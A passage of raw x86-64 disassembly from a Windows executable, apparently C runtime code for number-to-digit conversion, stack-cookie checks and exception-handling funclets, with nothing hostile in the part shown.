   14001031e:	8b c2                	mov    %edx,%eax
   140010320:	41 8b c8             	mov    %r8d,%ecx
   140010323:	c1 e8 1f             	shr    $0x1f,%eax
   140010326:	45 03 c0             	add    %r8d,%r8d
   140010329:	44 0b c0             	or     %eax,%r8d
   14001032c:	8b 45 07             	mov    0x7(%rbp),%eax
   14001032f:	03 d2                	add    %edx,%edx
   140010331:	c1 e9 1f             	shr    $0x1f,%ecx
   140010334:	45 03 c9             	add    %r9d,%r9d
   140010337:	44 8d 24 10          	lea    (%rax,%rdx,1),%r12d
   14001033b:	44 0b c9             	or     %ecx,%r9d
   14001033e:	44 3b e2             	cmp    %edx,%r12d
   140010341:	72 05                	jb     0x140010348
   140010343:	44 3b e0             	cmp    %eax,%r12d
   140010346:	73 21                	jae    0x140010369
   140010348:	45 33 f6             	xor    %r14d,%r14d
   14001034b:	41 8d 40 01          	lea    0x1(%r8),%eax
   14001034f:	41 8b ce             	mov    %r14d,%ecx
   140010352:	41 3b c0             	cmp    %r8d,%eax
   140010355:	72 05                	jb     0x14001035c
   140010357:	41 3b c3             	cmp    %r11d,%eax
   14001035a:	73 03                	jae    0x14001035f
   14001035c:	41 8b cb             	mov    %r11d,%ecx
   14001035f:	44 8b c0             	mov    %eax,%r8d
   140010362:	85 c9                	test   %ecx,%ecx
   140010364:	74 03                	je     0x140010369
   140010366:	45 03 cb             	add    %r11d,%r9d
   140010369:	48 8b 45 07          	mov    0x7(%rbp),%rax
   14001036d:	48 c1 e8 20          	shr    $0x20,%rax
   140010371:	45 8d 34 00          	lea    (%r8,%rax,1),%r14d
   140010375:	45 3b f0             	cmp    %r8d,%r14d
   140010378:	72 05                	jb     0x14001037f
   14001037a:	44 3b f0             	cmp    %eax,%r14d
   14001037d:	73 03                	jae    0x140010382
   14001037f:	45 03 cb             	add    %r11d,%r9d
   140010382:	41 8b c4             	mov    %r12d,%eax
   140010385:	44 03 ce             	add    %esi,%r9d
   140010388:	43 8d 14 24          	lea    (%r12,%r12,1),%edx
   14001038c:	c1 e8 1f             	shr    $0x1f,%eax
   14001038f:	45 33 e4             	xor    %r12d,%r12d
   140010392:	47 8d 04 36          	lea    (%r14,%r14,1),%r8d
   140010396:	44 0b c0             	or     %eax,%r8d
   140010399:	41 8b ce             	mov    %r14d,%ecx
   14001039c:	43 8d 04 09          	lea    (%r9,%r9,1),%eax
   1400103a0:	c1 e9 1f             	shr    $0x1f,%ecx
   1400103a3:	45 2b fb             	sub    %r11d,%r15d
   1400103a6:	89 55 e7             	mov    %edx,-0x19(%rbp)
   1400103a9:	0b c1                	or     %ecx,%eax
   1400103ab:	44 89 45 eb          	mov    %r8d,-0x15(%rbp)
   1400103af:	89 45 ef             	mov    %eax,-0x11(%rbp)
   1400103b2:	c1 e8 18             	shr    $0x18,%eax
   1400103b5:	44 88 65 f2          	mov    %r12b,-0xe(%rbp)
   1400103b9:	04 30                	add    $0x30,%al
   1400103bb:	41 88 02             	mov    %al,(%r10)
   1400103be:	4d 03 d3             	add    %r11,%r10
   1400103c1:	45 85 ff             	test   %r15d,%r15d
   1400103c4:	7e 08                	jle    0x1400103ce
   1400103c6:	8b 75 ef             	mov    -0x11(%rbp),%esi
   1400103c9:	e9 2c ff ff ff       	jmp    0x1400102fa
   1400103ce:	4d 2b d3             	sub    %r11,%r10
   1400103d1:	41 8a 02             	mov    (%r10),%al
   1400103d4:	4d 2b d3             	sub    %r11,%r10
   1400103d7:	3c 35                	cmp    $0x35,%al
   1400103d9:	7c 6a                	jl     0x140010445
   1400103db:	eb 0d                	jmp    0x1400103ea
   1400103dd:	41 80 3a 39          	cmpb   $0x39,(%r10)
   1400103e1:	75 0c                	jne    0x1400103ef
   1400103e3:	41 c6 02 30          	movb   $0x30,(%r10)
   1400103e7:	4d 2b d3             	sub    %r11,%r10
   1400103ea:	4c 3b d7             	cmp    %rdi,%r10
   1400103ed:	73 ee                	jae    0x1400103dd
   1400103ef:	4c 3b d7             	cmp    %rdi,%r10
   1400103f2:	73 07                	jae    0x1400103fb
   1400103f4:	4d 03 d3             	add    %r11,%r10
   1400103f7:	66 44 01 1b          	add    %r11w,(%rbx)
   1400103fb:	45 00 1a             	add    %r11b,(%r10)
   1400103fe:	44 2a d3             	sub    %bl,%r10b
   140010401:	41 80 ea 03          	sub    $0x3,%r10b
   140010405:	49 0f be c2          	movsbq %r10b,%rax
   140010409:	44 88 53 03          	mov    %r10b,0x3(%rbx)
   14001040d:	44 88 64 18 04       	mov    %r12b,0x4(%rax,%rbx,1)
   140010412:	41 8b c3             	mov    %r11d,%eax
   140010415:	48 8b 4d 17          	mov    0x17(%rbp),%rcx
   140010419:	48 33 cc             	xor    %rsp,%rcx
   14001041c:	e8 1f 2e ff ff       	call   0x140003240
   140010421:	48 8b 9c 24 08 01 00 	mov    0x108(%rsp),%rbx
   140010428:	00 
   140010429:	48 81 c4 c0 00 00 00 	add    $0xc0,%rsp
   140010430:	41 5f                	pop    %r15
   140010432:	41 5e                	pop    %r14
   140010434:	41 5d                	pop    %r13
   140010436:	41 5c                	pop    %r12
   140010438:	5f                   	pop    %rdi
   140010439:	5e                   	pop    %rsi
   14001043a:	5d                   	pop    %rbp
   14001043b:	c3                   	ret
   14001043c:	41 80 3a 30          	cmpb   $0x30,(%r10)
   140010440:	75 08                	jne    0x14001044a
   140010442:	4d 2b d3             	sub    %r11,%r10
   140010445:	4c 3b d7             	cmp    %rdi,%r10
   140010448:	73 f2                	jae    0x14001043c
   14001044a:	4c 3b d7             	cmp    %rdi,%r10
   14001044d:	73 af                	jae    0x1400103fe
   14001044f:	b8 20 00 00 00       	mov    $0x20,%eax
   140010454:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   14001045a:	66 44 89 23          	mov    %r12w,(%rbx)
   14001045e:	66 44 39 4d 99       	cmp    %r9w,-0x67(%rbp)
   140010463:	8d 48 0d             	lea    0xd(%rax),%ecx
   140010466:	44 88 5b 03          	mov    %r11b,0x3(%rbx)
   14001046a:	0f 44 c1             	cmove  %ecx,%eax
   14001046d:	88 43 02             	mov    %al,0x2(%rbx)
   140010470:	c6 07 30             	movb   $0x30,(%rdi)
   140010473:	e9 36 f6 ff ff       	jmp    0x14000faae
   140010478:	45 33 c9             	xor    %r9d,%r9d
   14001047b:	45 33 c0             	xor    %r8d,%r8d
   14001047e:	33 d2                	xor    %edx,%edx
   140010480:	33 c9                	xor    %ecx,%ecx
   140010482:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140010487:	e8 bc 3c ff ff       	call   0x140004148
   14001048c:	cc                   	int3
   14001048d:	45 33 c9             	xor    %r9d,%r9d
   140010490:	45 33 c0             	xor    %r8d,%r8d
   140010493:	33 d2                	xor    %edx,%edx
   140010495:	33 c9                	xor    %ecx,%ecx
   140010497:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   14001049c:	e8 a7 3c ff ff       	call   0x140004148
   1400104a1:	cc                   	int3
   1400104a2:	45 33 c9             	xor    %r9d,%r9d
   1400104a5:	45 33 c0             	xor    %r8d,%r8d
   1400104a8:	33 d2                	xor    %edx,%edx
   1400104aa:	33 c9                	xor    %ecx,%ecx
   1400104ac:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   1400104b1:	e8 92 3c ff ff       	call   0x140004148
   1400104b6:	cc                   	int3
   1400104b7:	45 33 c9             	xor    %r9d,%r9d
   1400104ba:	45 33 c0             	xor    %r8d,%r8d
   1400104bd:	33 d2                	xor    %edx,%edx
   1400104bf:	33 c9                	xor    %ecx,%ecx
   1400104c1:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   1400104c6:	e8 7d 3c ff ff       	call   0x140004148
   1400104cb:	cc                   	int3
   1400104cc:	ff 25 a6 0b 00 00    	jmp    *0xba6(%rip)        # 0x140011078
   1400104d2:	ff 25 80 0c 00 00    	jmp    *0xc80(%rip)        # 0x140011158
   1400104d8:	cc                   	int3
   1400104d9:	cc                   	int3
   1400104da:	cc                   	int3
   1400104db:	cc                   	int3
   1400104dc:	cc                   	int3
   1400104dd:	cc                   	int3
   1400104de:	cc                   	int3
   1400104df:	cc                   	int3
   1400104e0:	40 55                	rex push %rbp
   1400104e2:	48 83 ec 20          	sub    $0x20,%rsp
   1400104e6:	48 8b ea             	mov    %rdx,%rbp
   1400104e9:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   1400104ed:	48 83 c4 20          	add    $0x20,%rsp
   1400104f1:	5d                   	pop    %rbp
   1400104f2:	e9 21 3e ff ff       	jmp    0x140004318
   1400104f7:	cc                   	int3
   1400104f8:	40 55                	rex push %rbp
   1400104fa:	48 83 ec 20          	sub    $0x20,%rsp
   1400104fe:	48 8b ea             	mov    %rdx,%rbp
   140010501:	48 8b 4d 40          	mov    0x40(%rbp),%rcx
   140010505:	e8 0e 3e ff ff       	call   0x140004318
   14001050a:	90                   	nop
   14001050b:	48 83 c4 20          	add    $0x20,%rsp
   14001050f:	5d                   	pop    %rbp
   140010510:	c3                   	ret
   140010511:	cc                   	int3
   140010512:	40 55                	rex push %rbp
   140010514:	48 83 ec 20          	sub    $0x20,%rsp
   140010518:	48 8b ea             	mov    %rdx,%rbp
   14001051b:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   14001051f:	e8 f4 3d ff ff       	call   0x140004318
   140010524:	90                   	nop
   140010525:	48 83 c4 20          	add    $0x20,%rsp
   140010529:	5d                   	pop    %rbp
   14001052a:	c3                   	ret
   14001052b:	cc                   	int3
   14001052c:	40 55                	rex push %rbp
   14001052e:	48 83 ec 20          	sub    $0x20,%rsp
   140010532:	48 8b ea             	mov    %rdx,%rbp
   140010535:	48 8b 4d 48          	mov    0x48(%rbp),%rcx
   140010539:	48 83 c4 20          	add    $0x20,%rsp
   14001053d:	5d                   	pop    %rbp
   14001053e:	e9 d5 3d ff ff       	jmp    0x140004318
   140010543:	cc                   	int3
   140010544:	40 55                	rex push %rbp
   140010546:	48 83 ec 20          	sub    $0x20,%rsp
   14001054a:	48 8b ea             	mov    %rdx,%rbp
   14001054d:	48 8b 01             	mov    (%rcx),%rax
   140010550:	48 8b d1             	mov    %rcx,%rdx
   140010553:	8b 08                	mov    (%rax),%ecx
   140010555:	e8 5e 63 ff ff       	call   0x1400068b8
   14001055a:	90                   	nop
   14001055b:	48 83 c4 20          	add    $0x20,%rsp
   14001055f:	5d                   	pop    %rbp
   140010560:	c3                   	ret
   140010561:	cc                   	int3
   140010562:	40 55                	rex push %rbp
   140010564:	48 83 ec 20          	sub    $0x20,%rsp
   140010568:	48 8b ea             	mov    %rdx,%rbp
   14001056b:	8b 4d 40             	mov    0x40(%rbp),%ecx
   14001056e:	48 83 c4 20          	add    $0x20,%rsp
   140010572:	5d                   	pop    %rbp
   140010573:	e9 34 81 ff ff       	jmp    0x1400086ac
   140010578:	cc                   	int3
   140010579:	40 55                	rex push %rbp
   14001057b:	48 83 ec 20          	sub    $0x20,%rsp
   14001057f:	48 8b ea             	mov    %rdx,%rbp
   140010582:	48 63 4d 20          	movslq 0x20(%rbp),%rcx
   140010586:	48 8b c1             	mov    %rcx,%rax
   140010589:	48 8b 15 e0 b6 00 00 	mov    0xb6e0(%rip),%rdx        # 0x14001bc70
   140010590:	48 8b 14 ca          	mov    (%rdx,%rcx,8),%rdx
   140010594:	e8 cf 3d ff ff       	call   0x140004368
   140010599:	90                   	nop
   14001059a:	48 83 c4 20          	add    $0x20,%rsp
   14001059e:	5d                   	pop    %rbp
   14001059f:	c3                   	ret
   1400105a0:	cc                   	int3
   1400105a1:	40 55                	rex push %rbp
   1400105a3:	48 83 ec 20          	sub    $0x20,%rsp
   1400105a7:	48 8b ea             	mov    %rdx,%rbp
   1400105aa:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400105af:	48 83 c4 20          	add    $0x20,%rsp
   1400105b3:	5d                   	pop    %rbp
   1400105b4:	e9 e7 7a ff ff       	jmp    0x1400080a0
   1400105b9:	cc                   	int3
   1400105ba:	40 55                	rex push %rbp
   1400105bc:	48 83 ec 20          	sub    $0x20,%rsp
   1400105c0:	48 8b ea             	mov    %rdx,%rbp
   1400105c3:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400105c8:	48 83 c4 20          	add    $0x20,%rsp
   1400105cc:	5d                   	pop    %rbp
   1400105cd:	e9 ce 7a ff ff       	jmp    0x1400080a0
   1400105d2:	cc                   	int3
   1400105d3:	40 55                	rex push %rbp
   1400105d5:	48 83 ec 20          	sub    $0x20,%rsp
   1400105d9:	48 8b ea             	mov    %rdx,%rbp
   1400105dc:	b9 0b 00 00 00       	mov    $0xb,%ecx
   1400105e1:	e8 ba 7a ff ff       	call   0x1400080a0
   1400105e6:	90                   	nop
   1400105e7:	48 83 c4 20          	add    $0x20,%rsp
   1400105eb:	5d                   	pop    %rbp
   1400105ec:	c3                   	ret
   1400105ed:	cc                   	int3
   1400105ee:	40 55                	rex push %rbp
   1400105f0:	48 83 ec 20          	sub    $0x20,%rsp
   1400105f4:	48 8b ea             	mov    %rdx,%rbp
   1400105f7:	b9 0d 00 00 00       	mov    $0xd,%ecx
   1400105fc:	48 83 c4 20          	add    $0x20,%rsp
   140010600:	5d                   	pop    %rbp
   140010601:	e9 9a 7a ff ff       	jmp    0x1400080a0
   140010606:	cc                   	int3
   140010607:	40 55                	rex push %rbp
   140010609:	48 83 ec 20          	sub    $0x20,%rsp
   14001060d:	48 8b ea             	mov    %rdx,%rbp
   140010610:	b9 0c 00 00 00       	mov    $0xc,%ecx
   140010615:	48 83 c4 20          	add    $0x20,%rsp
   140010619:	5d                   	pop    %rbp
   14001061a:	e9 81 7a ff ff       	jmp    0x1400080a0
   14001061f:	cc                   	int3
   140010620:	40 55                	rex push %rbp
   140010622:	48 83 ec 20          	sub    $0x20,%rsp
   140010626:	48 8b ea             	mov    %rdx,%rbp
   140010629:	83 bd 80 00 00 00 00 	cmpl   $0x0,0x80(%rbp)
   140010630:	74 0b                	je     0x14001063d
   140010632:	b9 08 00 00 00       	mov    $0x8,%ecx
   140010637:	e8 64 7a ff ff       	call   0x1400080a0
   14001063c:	90                   	nop
   14001063d:	48 83 c4 20          	add    $0x20,%rsp
   140010641:	5d                   	pop    %rbp
   140010642:	c3                   	ret
   140010643:	cc                   	int3
   140010644:	40 55                	rex push %rbp
   140010646:	48 83 ec 20          	sub    $0x20,%rsp
   14001064a:	48 8b ea             	mov    %rdx,%rbp
   14001064d:	48 8b 0d 0c 90 00 00 	mov    0x900c(%rip),%rcx        # 0x140019660
   140010654:	48 83 c4 20          	add    $0x20,%rsp
   140010658:	5d                   	pop    %rbp
   140010659:	48 ff 25 f0 0a 00 00 	rex.W jmp *0xaf0(%rip)        # 0x140011150
   140010660:	cc                   	int3
   140010661:	40 55                	rex push %rbp
   140010663:	48 83 ec 20          	sub    $0x20,%rsp
   140010667:	48 8b ea             	mov    %rdx,%rbp
   14001066a:	b9 0e 00 00 00       	mov    $0xe,%ecx
   14001066f:	48 83 c4 20          	add    $0x20,%rsp
   140010673:	5d                   	pop    %rbp
   140010674:	e9 27 7a ff ff       	jmp    0x1400080a0
   140010679:	cc                   	int3
   14001067a:	40 55                	rex push %rbp
   14001067c:	48 83 ec 20          	sub    $0x20,%rsp
   140010680:	48 8b ea             	mov    %rdx,%rbp
   140010683:	b9 0a 00 00 00       	mov    $0xa,%ecx
   140010688:	48 83 c4 20          	add    $0x20,%rsp
   14001068c:	5d                   	pop    %rbp
   14001068d:	e9 0e 7a ff ff       	jmp    0x1400080a0
   140010692:	cc                   	int3
   140010693:	40 55                	rex push %rbp
   140010695:	48 83 ec 20          	sub    $0x20,%rsp
   140010699:	48 8b ea             	mov    %rdx,%rbp
   14001069c:	b9 0a 00 00 00       	mov    $0xa,%ecx
   1400106a1:	e8 fa 79 ff ff       	call   0x1400080a0
   1400106a6:	90                   	nop
   1400106a7:	48 83 c4 20          	add    $0x20,%rsp
   1400106ab:	5d                   	pop    %rbp
   1400106ac:	c3                   	ret
   1400106ad:	cc                   	int3
   1400106ae:	40 55                	rex push %rbp
   1400106b0:	48 83 ec 20          	sub    $0x20,%rsp
   1400106b4:	48 8b ea             	mov    %rdx,%rbp
   1400106b7:	b9 0b 00 00 00       	mov    $0xb,%ecx
   1400106bc:	48 83 c4 20          	add    $0x20,%rsp
   1400106c0:	5d                   	pop    %rbp
   1400106c1:	e9 da 79 ff ff       	jmp    0x1400080a0
   1400106c6:	cc                   	int3
   1400106c7:	cc                   	int3
   1400106c8:	cc                   	int3
   1400106c9:	cc                   	int3
   1400106ca:	cc                   	int3
   1400106cb:	cc                   	int3
   1400106cc:	cc                   	int3
   1400106cd:	cc                   	int3
   1400106ce:	cc                   	int3
   1400106cf:	cc                   	int3
   1400106d0:	40 55                	rex push %rbp
   1400106d2:	48 83 ec 20          	sub    $0x20,%rsp
   1400106d6:	48 8b ea             	mov    %rdx,%rbp
   1400106d9:	48 8b 01             	mov    (%rcx),%rax
   1400106dc:	33 c9                	xor    %ecx,%ecx
   1400106de:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   1400106e4:	0f 94 c1             	sete   %cl
   1400106e7:	8b c1                	mov    %ecx,%eax
   1400106e9:	48 83 c4 20          	add    $0x20,%rsp
   1400106ed:	5d                   	pop    %rbp
   1400106ee:	c3                   	ret
   1400106ef:	cc                   	int3
   1400106f0:	40 55                	rex push %rbp
   1400106f2:	48 83 ec 40          	sub    $0x40,%rsp
   1400106f6:	48 8b ea             	mov    %rdx,%rbp
   1400106f9:	83 7d 40 00          	cmpl   $0x0,0x40(%rbp)
   1400106fd:	74 3d                	je     0x14001073c
   1400106ff:	83 7d 44 00          	cmpl   $0x0,0x44(%rbp)
   140010703:	74 28                	je     0x14001072d
   140010705:	48 8b 85 80 00 00 00 	mov    0x80(%rbp),%rax
   14001070c:	48 63 08             	movslq (%rax),%rcx
   14001070f:	48 8b c1             	mov    %rcx,%rax
   140010712:	48 c1 f8 05          	sar    $0x5,%rax
   140010716:	48 8d 15 f3 a7 00 00 	lea    0xa7f3(%rip),%rdx        # 0x14001af10
   14001071d:	83 e1 1f             	and    $0x1f,%ecx
   140010720:	48 6b c9 58          	imul   $0x58,%rcx,%rcx
   140010724:	48 8b 04 c2          	mov    (%rdx,%rax,8),%rax
   140010728:	80 64 08 08 fe       	andb   $0xfe,0x8(%rax,%rcx,1)
   14001072d:	48 8b 85 80 00 00 00 	mov    0x80(%rbp),%rax
   140010734:	8b 08                	mov    (%rax),%ecx
   140010736:	e8 71 7f ff ff       	call   0x1400086ac
   14001073b:	90                   	nop
   14001073c:	48 83 c4 40          	add    $0x40,%rsp
   140010740:	5d                   	pop    %rbp
   140010741:	c3                   	ret
   140010742:	cc                   	int3
   140010743:	40 55                	rex push %rbp
   140010745:	48 83 ec 20          	sub    $0x20,%rsp
   140010749:	48 8b ea             	mov    %rdx,%rbp
   14001074c:	b9 0c 00 00 00       	mov    $0xc,%ecx
   140010751:	48 83 c4 20          	add    $0x20,%rsp
   140010755:	5d                   	pop    %rbp
   140010756:	e9 45 79 ff ff       	jmp    0x1400080a0
   14001075b:	cc                   	int3
   14001075c:	40 55                	rex push %rbp
   14001075e:	48 83 ec 20          	sub    $0x20,%rsp
   140010762:	48 8b ea             	mov    %rdx,%rbp
   140010765:	b9 0d 00 00 00       	mov    $0xd,%ecx
   14001076a:	48 83 c4 20          	add    $0x20,%rsp
   14001076e:	5d                   	pop    %rbp
   14001076f:	e9 2c 79 ff ff       	jmp    0x1400080a0
   140010774:	cc                   	int3
   140010775:	40 55                	rex push %rbp
   140010777:	48 83 ec 20          	sub    $0x20,%rsp
   14001077b:	48 8b ea             	mov    %rdx,%rbp
   14001077e:	8b 4d 50             	mov    0x50(%rbp),%ecx
   140010781:	48 83 c4 20          	add    $0x20,%rsp
   140010785:	5d                   	pop    %rbp
   140010786:	e9 21 7f ff ff       	jmp    0x1400086ac
   14001078b:	cc                   	int3
   14001078c:	40 55                	rex push %rbp
   14001078e:	48 83 ec 20          	sub    $0x20,%rsp
   140010792:	48 8b ea             	mov    %rdx,%rbp
   140010795:	48 83 c4 20          	add    $0x20,%rsp
   140010799:	5d                   	pop    %rbp
   14001079a:	e9 65 69 ff ff       	jmp    0x140007104
   14001079f:	cc                   	int3
   1400107a0:	40 55                	rex push %rbp
   1400107a2:	48 83 ec 20          	sub    $0x20,%rsp
   1400107a6:	48 8b ea             	mov    %rdx,%rbp
   1400107a9:	83 7d 60 00          	cmpl   $0x0,0x60(%rbp)
   1400107ad:	74 08                	je     0x1400107b7
   1400107af:	33 c9                	xor    %ecx,%ecx
   1400107b1:	e8 ea 78 ff ff       	call   0x1400080a0
   1400107b6:	90                   	nop
   1400107b7:	48 83 c4 20          	add    $0x20,%rsp
   1400107bb:	5d                   	pop    %rbp
   1400107bc:	c3                   	ret
   1400107bd:	cc                   	int3
